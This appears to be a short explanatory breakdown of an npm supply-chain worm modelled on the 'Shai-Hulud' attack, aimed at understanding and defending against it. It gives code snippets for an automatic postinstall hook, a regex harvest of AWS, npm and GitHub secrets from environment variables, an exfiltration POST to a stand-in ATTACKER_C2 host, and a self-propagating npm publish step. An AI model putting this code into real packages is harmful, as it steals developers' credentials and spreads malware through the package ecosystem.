1 The Trojan Package

A legitimate-looking package (@benign-looking/color-utils) contains a postinstall script in its package.json. This runs automatically on npm install — no user interaction needed. 

{
  "name": "@benign-looking/color-utils",
  "version": "2.1.4",
  "scripts": {
    "postinstall": "node scripts/postinstall.js"
  }
}

2 Secret Harvesting

The postinstall script scans process.env for anything matching secret patterns: AWS keys, npm/GitHub tokens, database URLs, API keys. In the real attack, TruffleHog was also used to scan the filesystem. 

const SECRET_PATTERNS = [
  /^AWS_/, /^NPM_/, /^GITHUB_/,
  /TOKEN/i, /SECRET/i, /^DATABASE_URL$/
];

// Scan every env var
for (const [key, value] of Object.entries(process.env)) {
  if (SECRET_PATTERNS.some(p => p.test(key)))
    found[key] = value;  // gotcha
}

3 Exfiltration & Propagation

Harvested secrets are sent to an attacker-controlled server. In the real attack, secrets were double-base64 encoded and pushed to public GitHub repos named "Shai-Hulud". If an npm token was found, the malware used it to publish poisoned versions of other packages — making it a self-propagating worm. 

// Exfiltrate
http.request({ host: ATTACKER_C2, path: "/exfil", method: "POST" })
  .write(JSON.stringify({ hostname, secrets, npmToken, githubToken }));

// Worm: if npm token found, publish malicious versions of accessible packages
if (secrets.NPM_TOKEN) {
  exec(`npm publish --tag latest`);  // infect more packages
}
